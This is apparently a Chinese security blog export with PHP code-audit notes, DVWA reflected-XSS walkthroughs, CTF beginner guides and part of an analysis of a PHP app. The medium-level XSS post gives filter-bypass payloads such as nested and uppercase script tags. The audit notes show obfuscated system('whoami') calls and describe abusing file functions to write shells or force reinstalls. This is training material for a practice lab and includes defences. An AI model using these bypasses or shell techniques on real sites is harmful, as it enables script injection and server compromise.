此函数把GET、POST、COOKIE的参数注册为变量，一般不建议开启 注意,只在 PHP4.1到PHP5.4之间可用 1234567&lt;?php $name = 'whoami'; import_request_variables('GP'); //G表示GET、P表示POST如果有C表示COOKIE；这里的GP表示注册GET和POST请求的参数为变量 echo $name;?&gt; 效果： array_key_exists()：1array_key_exists ( $key , $array ) 数组里有键 key 时，array_key_exists() 返回 TRUE。 key 可以是任何能作为数组索引的值。 str_ireplace过滤sql语句：此函数用法：将 whoami? 中的 whoami 被 iamfree 替换，也就是说把whoami?里的whoami替换成iamfree所以结果就是iamfree? 这里其实是可以绕过的，比如： 变量覆盖: 难一点的： 12345678&lt;?php foreach (array( '_GET','_POST' ) as $key =&gt; $value) &#123; foreach ($$value as $_key =&gt; $_value)&#123; echo $_key.':'.$_value; echo \"&lt;br &gt;\"; &#125; &#125;?&gt; 执行后的结果： define()用法:1234&lt;?php define('t',time()); //把time()的返回值定义为常量(t) echo t;?&gt; 三元表达式: 123456&lt;?php $name = !empty($_GET['name']) ? $_GET['name'] : '此人无名'; //表示如果$_GET['name']不为空的话就返回$_GET['name']如果为空就返回 此人无名。 echo $name;?&gt; 还可以有一种判断方法： 12345&lt;?php echo 1; isset($_GET['name']) &amp;&amp; exit('exit'); //如果isset($_GET['name'])为真也就是name这个参数存在的时候，会执行exit('exit')，相反，不存在的时候不会执行exit('exit') echo 2;?&gt; name参数不存在时： name参数存在时： nl2br()函数: eval()函数: 12345678&lt;?php$string = 'cup';$name = 'coffee';$str = 'This is a $string with my $name in it.';echo $str. \"\\n\";eval(\"\\$str = \\\"$str\\\";\");echo $str. \"\\n\";?&gt; 输出：This is a $string with my $name in it.This is a cup with my coffee in it. explode()函数: 也就是拆分 copy()函数: copy(source,destination)参数 | 描述:-: | :-:source | 必需。规定要复制的文件。destination | 必需。规定复制文件的目的地。 将文件从 source 拷贝到 destination。如果成功则返回 TRUE，否则返回 FALSE。 trim()函数:移除字符串两侧的空格等特殊字符 strcasecmp()函数: 正则表达式:preg_match()函数: 匹配一下i：这里的//是定界符 ，之需要二处字符一样就可以，比如== -- ?? 等等 但是有些不能做定位符 比如a到z、A到Z、0到9、空格、\\ 匹配全部英文字母(包括大写)： 替换匹配到的内容: define()函数：1define(name,value,case_insensitive) 参数 描叙 name 必需。规定常量的名称。 value 必需。规定常量的值。 case_insensitive 可选。规定常量的名称是否对大小写敏感。 若设置为 true，则对变量名大小写不敏感。默认是 false（大小写敏感）。 dirname()函数：dirname(path)参数|描述:–:|:–:path|必需。规定要检查的路径。 该函数返回去掉文件名后的目录名 iconv()函数：iconv ( in_charset , out_charset , str )将字符串 str 从 in_charset 转换编码到 out_charset。 intval()函数:还可以当防止SQL注入: reset()函数: $$变量覆盖: 还有一个很有趣的：1234567&lt;?php $g = '_GET'; $g = $$g; //这个时候$$g的第二个$与$g的值拼接了变成了$_GET，第一个$变成了$g，所以$g=$_GET echo $g['name']; ?&gt; isset()函数:检测变量是否已设置并且非 NULLunset()函数:释放给定的变量 parse_ini_file() 解析一个配置文件。1array parse_ini_file ( string $filename [, bool $process_sections = false [, int $scanner_mode = INI_SCANNER_NORMAL ]] ) 载入一个由 filename 指定的 ini 文件，并将其中的设置作为一个联合数组返回。 参数 用法 filename 要解析的 ini 文件的文件名。 process_sections 如果将最后的 process_sections 参数设为 TRUE，将得到一个多维数组，包括了配置文件中每一节的名称和设置。process_sections 的默认值是 FALSE。 scanner_mode Can either be INI_SCANNER_NORMAL (default) or INI_SCANNER_RAW. If INI_SCANNER_RAW is supplied, then option values will not be parsed. 返回值： 成功时以关联数组 array 返回设置，失败时返回 FALSE。 urldecode()函数，可能会造成urldecode二次注入： $_FILES用法: is_numeric()函数： 判断是否为数字，是返回1，不是返回空 dvwa的sql注入的impossible等级源码(dvwa的impossible不存在sql注入)：当然 我看不懂这几行:12$data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );$data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); substr()函数:12345678910&lt;?php$rest = substr(\"abcdef\", -1); // 返回 \"f\"$rest = substr(\"abcdef\", -2); // 返回 \"ef\"$rest = substr(\"abcdef\", -3, 1); // 返回 \"d\"$rest = substr(\"abcdef\", 0, -1); // 返回 \"abcde\"$rest = substr(\"abcdef\", 2, -1); // 返回 \"cde\"$rest = substr(\"abcdef\", 4, -4); // 返回 \"\"$rest = substr(\"abcdef\", -3, -1); // 返回 \"de\"?&gt; strrpos()函数:1234567891011&lt;?php$foo = \"0123456789a123456789b123456789c\";var_dump(strrpos($foo, '7', -5)); // 从尾部第 5 个位置开始查找 // 结果: int(17)var_dump(strrpos($foo, '7', 20)); // 从第 20 个位置开始查找 // 结果: int(27)var_dump(strrpos($foo, '7', 28)); // 结果: bool(false)?&gt; extract()函数： 常见语法：1if(empty($a)) $a = 'hello world'; //如果$a为空，那么它的值为hello world 123$s = 'sys'.'tem';$s('whoami'); //返回desktop-a0iqkh2\\iamfree/*这里就是执行了whoami的命令*/ 匿名函数：12$C_F = create_function('$name','return $name;'); //$name的位置是传递什么参数，第二个参数是函数里执行什么代码echo $C_F('iamfree'); //输出iamfree 回调函数：12345function Func($name)&#123; echo \"hello $name\";&#125;call_user_func('Func','iamfree'); /*输出:hello iamfree*/ 12call_user_func(&apos;system&apos;,&apos;whoami&apos;);/*输出：desktop-a0iqkh2\\iamfree*/ 命令执行函数： exec() — 执行一个外部程序 passthru() — 执行外部程序并且显示原始输出 proc_open() — 执行一个命令，并且打开用来输入/输出的文件指针。 shell_exec() &amp; — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。 system() — 执行外部程序，并且显示输出 popen() — 通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。 文件操作函数： copy — 拷贝文件 file_get_contents — 将整个文件读入一个字符串 file_put_contents — 将一个字符串写入文件 file — 把整个文件读入一个数组中 fopen — 打开文件或者 URL move_uploaded_file — 将上传的文件移动到新位置 readfile — 输出文件 rename — 重命名一个文件或目录 rmdir — 删除目录 unlink &amp; delete — 删除文件 任意文件读取、写入、删除往往是上面几个函数受到了控制（当然还有其他的函数）。不同的函数在不同的场景有不同的作用和不同的利用手法。读取：可以读取配置等文件，拿到key写入：可以写入shell代码相关的内容删除：可以删除.lock文件而可以重新安装覆盖 特殊函数信息泄漏bool phpinfo ([ int $what = INFO_ALL ] )输出 PHP 当前状态的大量信息，包含了PHP编译选项、启用的扩展、PHP版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和主值、HTTP头和PHP授权信息(License)。 软连接-读取文件内容bool symlink ( string $target , string $link )symlink() 对于已有的 target 建立一个名为 link 的符号连接。string readlink ( string $path )readlink() 和同名的 C 函数做同样的事，返回符号连接的内容。 环境变量string getenv ( string $varname )获取一个环境变量的值。bool putenv ( string $setting )添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 加载扩展bool dl ( string $library )载入指定参数 library 的 PHP 扩展。 配置相关string ini_get ( string $varname ) 成功时返回配置选项的值。12string ini_set ( string $varname , string $newvalue )string ini_alter ( string $varname , string $newvalue ) 设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。void ini_restore ( string $varname )恢复指定的配置选项到它的原始值。 数字判断bool is_numeric ( mixed $var )如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。 数组相关bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。该函数有一个特性，比较之前会进行自动类型转换。in_array($str,$arr)判断$str是否在$arr数组里 变量覆盖如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域：void parse_str ( string $str [, array &amp;$arr ] )本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突：int extract ( array &amp;$var_array [, int $extract_type = EXTR_OVERWRITE [, string $prefix = NULL ]] ) bool mb_parse_str ( string $encoded_string [, array &amp;$result ] )解析 GET/POST/COOKIE 数据并设置全局变量。 由于 PHP 不提供原始 POST/COOKIE 数据，目前它仅能够用于 GET 数据。 它解析了 URL 编码过的数据，检测其编码，并转换编码为内部编码，然后设置其值为 array的 result 或者全局变量。bool import_request_variables ( string $types [, string $prefix ] )将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。 123456789101112131415&lt;?php$str = \"first=value&amp;arr[]=foo+bar&amp;arr[]=baz\";// 推荐用法parse_str($str, $output);echo $output['first']; // valueecho $output['arr'][0]; // foo barecho $output['arr'][41]; // baz// 不建议这么用parse_str($str);echo $first; // valueecho $arr[0]; // foo barecho $arr[1]; // baz?&gt; 列目录array glob ( string $pattern [, int $flags = 0 ] )glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般shell所用的规则一样。不进行缩写扩展或参数替代。var_dump(glob(&#39;c*.php&#39;)); //列出c开头的PHP文件 无参数获取信息返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量: array get_defined_vars ( void )返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的:array get_defined_constants ([ bool $categorize = false ] )返回一个包含所有已定义函数列表的多维数组:array get_defined_functions ( void )返回所有被 include、 include_once、 require 和 require_once:array get_included_files ( void ) rand()函数: $_REQUEST用法： file_exists()函数：检查文件或目录是否存在 exit用法：多处用在install.php里，因为成功安装一次之后就能再一次运行安装了，除非将exit删除了。 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"编程","slug":"编程","permalink":"127.0.0.1/categories/编程/"},{"name":"代码审计","slug":"编程/代码审计","permalink":"127.0.0.1/categories/编程/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"127.0.0.1/tags/PHP/"},{"name":"原创","slug":"原创","permalink":"127.0.0.1/tags/原创/"}]},{"title":"Dvwa中xss的impossible等级是如何防御的","slug":"Dvwa中xss的impossible等级是如何防御的","date":"2018-05-25T13:59:43.000Z","updated":"2018-05-26T15:15:08.000Z","comments":true,"path":"2018/05/25/Dvwa中xss的impossible等级是如何防御的/","link":"","permalink":"127.0.0.1/2018/05/25/Dvwa中xss的impossible等级是如何防御的/","excerpt":"在之前分别讲了Dvwa的Xss测试的Low、Medium、High等级，这节课就深入的来讲impossible如何防御的( 其实之前文章也有讲过，不详细，这节课就深入的来讲解一下 )","text":"在之前分别讲了Dvwa的Xss测试的Low、Medium、High等级，这节课就深入的来讲impossible如何防御的( 其实之前文章也有讲过，不详细，这节课就深入的来讲解一下 ) 老套路，直接看源码:123456789101112131415161718&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这段代码中的checkToken()函数是用于防御Csrf攻击的，先不用管，我们先来看看这个htmlspecialchars()函数 官方解释htmlspecialchars — 将特殊字符转换为 HTML 实体 执行转换 字符 替换后 &amp; （和号） 成为 &amp;amp; “ （双引号） 成为 &amp;quot; ‘ （单引号） 成为 &#39; &lt; （小于） 成为 &amp;lt; > （大于） 成为 &amp;gt; 开始操作未过滤先看一段代码简单的代码： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $name = $_GET['name']; ?&gt; &lt;h1&gt;你好，&lt;?php echo $name;?&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 访问http://127.0.0.1/myphp/demo.php?name=1: 访问http://127.0.0.1/myphp/demo.php?name=&lt;img src=x&gt;: 可见，这个是存在Xss的，那么我们用htmlspecialchars函数来过滤~ 过滤12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $name = $_GET['name']; $name = htmlspecialchars( $name ); ?&gt; &lt;h1&gt;你好，&lt;?php echo $name;?&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 继续访问http://127.0.0.1/myphp/demo.php?name=&lt;img src=x&gt;: 看到这里，你们就会好奇了，为什么会直接把输入的内容输出出来，而不是以代码被解析？我们打开审查元素看一看(F12) 我们可以发现这里是把&lt;变成了&amp;lt;,把’&gt;’变成了&amp;gt;，从而导致了代码只会原样输出而不会当成代码来编译 如果你还困惑的，我再给你看一段代码:12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;你好，&amp;lt;img src=x&amp;gt;&lt;/h1&gt; &lt;!-- 注意看这里 --&gt;&lt;/body&gt;&lt;/html&gt; 访问http://127.0.0.1/myphp/demo.php: Dvwa演练平台的Xss反射型部分撒花完结~ 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"127.0.0.1/tags/PHP/"},{"name":"Dvwa","slug":"Dvwa","permalink":"127.0.0.1/tags/Dvwa/"},{"name":"渗透测试","slug":"渗透测试","permalink":"127.0.0.1/tags/渗透测试/"},{"name":"Xss","slug":"Xss","permalink":"127.0.0.1/tags/Xss/"}]},{"title":"基于DVWA的反射型Xss测试平台high等级讲解","slug":"基于DVWA的反射型Xss测试平台high等级讲解","date":"2018-05-25T13:52:36.000Z","updated":"2018-05-25T15:09:22.000Z","comments":true,"path":"2018/05/25/基于DVWA的反射型Xss测试平台high等级讲解/","link":"","permalink":"127.0.0.1/2018/05/25/基于DVWA的反射型Xss测试平台high等级讲解/","excerpt":"这是继上节课[基于DVWA的Xss测试平台Medium等级讲解]的high等级","text":"这是继上节课[基于DVWA的Xss测试平台Medium等级讲解]的high等级 废话不多说，直接开始了~ 设置等级、查看源代码等操作不再重复了，直接把high等级的代码复制到这里:1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 最主要的看这行代码$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );，这个是正则匹配，把(.*)里的字符统统变成&#39;&#39;；这里的i就表示这个匹配是不区分大小写的，所以上一个等级的大写绕过大法是没用了，可以说在这里基本上是在script标签里的代码都不能实现了，那么我们可以用另一种办法实现 利用其它标签执行js代码: 如何防御？这里我就不再重复了，前面两章说的十分清楚了~ 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"127.0.0.1/tags/PHP/"},{"name":"Dvwa","slug":"Dvwa","permalink":"127.0.0.1/tags/Dvwa/"},{"name":"渗透测试","slug":"渗透测试","permalink":"127.0.0.1/tags/渗透测试/"},{"name":"Xss","slug":"Xss","permalink":"127.0.0.1/tags/Xss/"}]},{"title":"CTF比赛模式","slug":"CTF比赛模式","date":"2018-05-25T08:38:38.000Z","updated":"2018-05-26T12:59:08.000Z","comments":true,"path":"2018/05/25/CTF比赛模式/","link":"","permalink":"127.0.0.1/2018/05/25/CTF比赛模式/","excerpt":"目前主要的CTF比赛模式如下","text":"目前主要的CTF比赛模式如下 一、解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与比赛，比赛以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛，比赛一般会持续48小时及以上。题目类型主要包含逆向分析、漏洞挖掘与利用、移动安全、Web安全、密码、取证、隐写、编程、流量分析等等类别。 二、攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负。这种赛制一般在线下举行，在这种赛制中，不仅仅是比拼参赛队员的智力和技术，也比拼体力（因为比赛一般都会持续48小时及以上），同时也比拼团队之间的分工配合与合作。 三、混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。(改自ctf（夺旗赛）) 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"CTF","slug":"CTF","permalink":"127.0.0.1/categories/CTF/"}],"tags":[{"name":"转载文章","slug":"转载文章","permalink":"127.0.0.1/tags/转载文章/"},{"name":"CTF","slug":"CTF","permalink":"127.0.0.1/tags/CTF/"}]},{"title":"CTF如何入门","slug":"CTF如何入门","date":"2018-05-25T08:20:03.000Z","updated":"2018-05-26T12:59:04.000Z","comments":true,"path":"2018/05/25/CTF如何入门/","link":"","permalink":"127.0.0.1/2018/05/25/CTF如何入门/","excerpt":"希望你抱着学习和提高的目的进入CTF坑，不要一味为了比赛而比赛迷失其中，勿忘初心，方能始终，与君共勉：）","text":"希望你抱着学习和提高的目的进入CTF坑，不要一味为了比赛而比赛迷失其中，勿忘初心，方能始终，与君共勉：） 题目类型 Web Crypto PWN Misc stego forensic … Reverse PPC(Professonal ProgramCoder) 国际比赛：DEFCON资格赛国内比赛：XCTF联赛 打CTF的意义 思维能力 快速学习能力 技术能力 如何入门 编程语言基础（C语言、汇编语言、大部分脚本语言） 数学基础（算法、密码学） 脑洞大开、并落地（天马行空的想象、推理解密） 体力耐力（通宵熬夜不睡觉，学习新技术、突破难关，结果不重要，过程很重要） 如何学? 恶补基础知识 从脑洞开始 从基础题出发 单、双点知识 学习信息安全专业知识 锻炼体力耐力 学之前的思考分析赛题情况 Crypto偏重对数学、算法的学习 Web偏重发散思惟、对技巧沉淀、快速搜索能力的挑战，漏洞点几类 Misc则更为复杂：隐写类、图片数据分析、数据还原、流量分析、大数据 分析自身兴趣 PWN+Re+Crypto随机搭配 Web+Misc组合 精力有限先从一两个方向做起 如何恶补知识 linux、组原、OS、网络协议分析 二进制：IDA工具使用，f5插件、OD、逆向工程、密码学、缓冲区溢出 推荐书籍 RE for Beginners(逆向工程入门。德国) IDA PRO权威指南 揭秘家用路由器0day漏洞挖掘技术 自己动手写操作系统 黑客攻防技术宝典：系统实战篇 web：网络安全、内网渗透、数据库安全、OWASPTOP10 Web应用安全权威指南。日本！！！宏观 Web前端黑客技术揭秘——总结、吃透则直线上升、核心技术点都包含 黑客秘籍-渗透测试使用指南 黑客攻防技术宝典：web实战篇 代码审计：企业级web代码安全架构 如何成为一个赛棍从基础题目出发 http://ctf.idf.cn idf实验室，非常基础，单点知识，挫败感较小 www.ichunqiu.com 线下线上题目复现 http://oj.xctf.org.cn xctf历年题目，较难 www.wechall.net/challs 非常入门的国外CTF 入门网站 国内安全大牛出发点，可首选 http://canyouhack.it 非常入门，涉及一些移动安全 http://microcorruption.com/login 很酷炫，游戏化，二进制方向 http://smashthestack.org/ war game 非常简洁的内容 ssh连入即玩 http://overthewire.org/wargames 老牌wargame,国内资料较多，WP: http://drops.wooyun.org/author/litao3rd http://exploit-exercises.com 老牌wargame，国内资料较多 http://pwnable.kr/play.php 100题左右，较基础 http://ctf.moonsos.com/pentest/index.php web安全核心技术点 http://prompt.ml/0 xss 国外测试平台,不考核对错，自己尝试 http://redtiger.labs.overthewire.org sql注入挑战赛 工具 burp、ida https://github.com/truongkma/ctf-tools https://github.com/P1kachu/v0lt https://github.com/zardus/ctf-tools https://github.com/TUCTF/Tools 以练促赛、以赛养练：都参与，不在乎名次，看多个WP，对比，重视思路，复现过程，寻找相关题目。以练促赛：选择一场已经存在WP的比赛以赛养练：参加一场最新的CTF，名次不重要，赛后要吃透，猜测作者怎么想，跟着作者想法走https://ctftime.org/ 国际比赛http://www.xctf.org.cn/ 国内比赛 组建团队:强力成员画像 思维跳跃：灵活、不钻牛角尖 专注：遇到问题不放弃直到解决 耐力：可以一昼夜不睡觉地研究技术 团队精神：责任、凝聚（相信将来总会得第一）、分享（先富带动后富） 有以上三条为强力成员，四条可为队长 组建团队要解决的问题 新人招募：如何评判新人潜力 队员培养：如何快速培养队伍能力 梯队有序：如何建立梯队层级 纪律严格：如何拒绝无团队精神的成员 坚持不懈，相信未来我们一定会成为第一的！十年寒窗无人问，一举成名天下知！ – Cai_Team","categories":[{"name":"CTF","slug":"CTF","permalink":"127.0.0.1/categories/CTF/"}],"tags":[{"name":"转载文章","slug":"转载文章","permalink":"127.0.0.1/tags/转载文章/"},{"name":"CTF","slug":"CTF","permalink":"127.0.0.1/tags/CTF/"}]},{"title":"基于DVWA的反射型Xss测试平台Medium等级讲解","slug":"基于DVWA的反射型Xss测试平台Medium等级讲解","date":"2018-05-25T02:27:24.000Z","updated":"2018-05-25T14:04:08.000Z","comments":true,"path":"2018/05/25/基于DVWA的反射型Xss测试平台Medium等级讲解/","link":"","permalink":"127.0.0.1/2018/05/25/基于DVWA的反射型Xss测试平台Medium等级讲解/","excerpt":"这是继上节课[基于DVWA的Xss测试平台Low等级讲解]的中等级","text":"这是继上节课[基于DVWA的Xss测试平台Low等级讲解]的中等级 首先，我们把等级设置为Medium 上节课讲了如何设置这里就不再讲了 查看Medium源代码: 点开后是这样的： 代码：1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 这里的代码部分也很好理解，比上一章仅仅多了一个过滤，下面来详细讲解一下。 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL )这段代码的意思是，如果$_GET中有name这个key并且$_GET[ &#39;name&#39; ]的值不为空的话就执行{}里面的代码。$name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );这句话的意思是把$_GET[&#39; name &#39;]中的&lt;script&gt;过滤为空( 并不安全 ),最后一段代码就是输出Hello+name的值在页面上 看懂代码后，如何利用呢?我们在上面看代码的时候明白了，在这个Medium等级中，只做了把&lt;script&gt;字符给过滤了，那么我下面就来演示一下如何绕过 先来输入&lt;script&gt;后看看是否为空:可以看到这里的输出是为空的，下面来讲绕过 绕过方法1：在输入框中输入&lt;scr&lt;script&gt;ipt&gt;alert(&#39;iamfree&#39;)&lt;/script&gt;，来看看结果先: 解释: 绕过方法2:用大写的绕过,输入&lt;SCRIPT&gt;alert(&#39;iamfree&#39;)&lt;/SCRIPT&gt; 如何防御防御方法1:其实防御的方法也和上篇一样，但还有一个也很棒的方法哟。 代码:1234567891011121314151617&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input // $name = str_replace( '&lt;script&gt;', 'xss', $_GET[ 'name' ] ); foreach ( $_GET as $key =&gt; $value ) &#123; //把$_GET数组里的值分成$key和$value $name = $_GET[ $key ] = htmlspecialchars( $value ); //把$_GET数组中$key对应的$value值html实例化，并且赋值给$name变量 &#125; // Feedback for end user $html .= \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 防御方法2： 只需要加上一条preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )，这也是high等级的防御方法 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"127.0.0.1/tags/PHP/"},{"name":"Dvwa","slug":"Dvwa","permalink":"127.0.0.1/tags/Dvwa/"},{"name":"渗透测试","slug":"渗透测试","permalink":"127.0.0.1/tags/渗透测试/"},{"name":"Xss","slug":"Xss","permalink":"127.0.0.1/tags/Xss/"}]},{"title":"简单的用户管理分析","slug":"简单的用户管理分析","date":"2018-05-24T13:14:59.000Z","updated":"2018-05-25T07:12:32.000Z","comments":true,"path":"2018/05/24/简单的用户管理分析/","link":"","permalink":"127.0.0.1/2018/05/24/简单的用户管理分析/","excerpt":"项目介绍这是笔者从GITHUB上找的简单PHP程序( 一个可 增删查 的用户数据管理 )","text":"项目介绍这是笔者从GITHUB上找的简单PHP程序( 一个可 增删查 的用户数据管理 ) 数据库连接代码:先介绍一下数据库的表结构： 123456&lt;?php $pdo = new PDO('mysql:host=localhost;dbname=data','root','root'); //PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换) $pdo-&gt;exec('set names utf8'); //设置编码 $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_ASSOC); //设置默认结果集模式为关联数组 $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); //修改报错模式?&gt; 其中的PDO是:PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换) PDO好处： 更换数据库时取得极大便利(从A数据库换成其他数据库可以不需要修改查询的代码，因为PDO帮我实现了) 更换数据库时取得极大便利 首页代码：12345678910111213141516171819202122232425&lt;?php include 'config.inc.php'; //包含连接数据库的代码 $len = 10; //每页展现10条数据 $page = !empty($_GET[\"page\"]) ? $_GET[\"page\"] : 1;//三元表达式，表示如果$_GET['page']为空时，默认值为1 $sqlTotal = \"select count(Id) from t1\"; // SQL语句。意思是查询t1表中的Id字段个数 $smtTotal = $pdo-&gt;prepare($sqlTotal); //准备要执行的SQL语句并返回一个 PDOStatement 对象(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0) echo \"&lt;strong&gt;\\$sqlTotal:&lt;/strong&gt;\"; print_r($smtTotal); echo \"&lt;br /&gt;\"; echo \"&lt;strong&gt;execute():&lt;/strong&gt;\"; print_r($smtTotal-&gt;execute()); $tot = $smtTotal-&gt;fetchColumn(); //总记录数 echo \"&lt;br /&gt;\"; echo \"&lt;strong&gt;\\$tot:&lt;/strong&gt;\"; print_r($tot); echo \"&lt;br /&gt;\"; $pages = ceil($tot/$len); //总页数 echo \"&lt;strong&gt;\\$pages:&lt;/strong&gt;\"; print_r($pages); ... ...(省略，先讲解一下这段代码的用法) 可以看看我写的PDO的文章(别夸我，谁让我是爱学习的好孩子) 首页的代码我统统写了注释： 更改用户数据代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php/* 思路:先获取对应的数据，然后返回到输入框，如果我们选择提交，表单就会发送的数据就会更改到数据库里，实现更改内容*/ include 'config.inc.php';$Id = $_GET[\"Id\"]; //获取GET请求过来的Id值$sql = \"select * from t1 where Id=?\"; //SQL语句的查询$smt = $pdo-&gt;prepare($sql); //给SQL语句做标记$smt-&gt;bindValue(1,$Id); //想成是给上面的?改成$Id变量的值$smt-&gt;execute(); //执行SQL语句$row = $smt-&gt;fetch(); //接收SQL语句查询到的结果?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;update&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;script type=\"text/javascript\" src=\"bower_components/jquery/dist/jquery.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"bower_components/bootstrap/dist/js/bootstrap.min.js\"&gt;&lt;/script&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"bower_components/bootstrap/dist/css/bootstrap.min.css\"&gt;&lt;body&gt;&lt;div class=\"container\"&gt; &lt;h1 class=\"page-header\"&gt; &lt;a href=\"index.php\" class=\"btn btn-warning\"&gt;查看用户&lt;/a&gt; &lt;a href=\"\" class=\"btn btn-primary\"&gt;修改用户&lt;/a&gt; &lt;/h1&gt; &lt;form action=\"act.php?act=update&amp;Id=&lt;?php echo 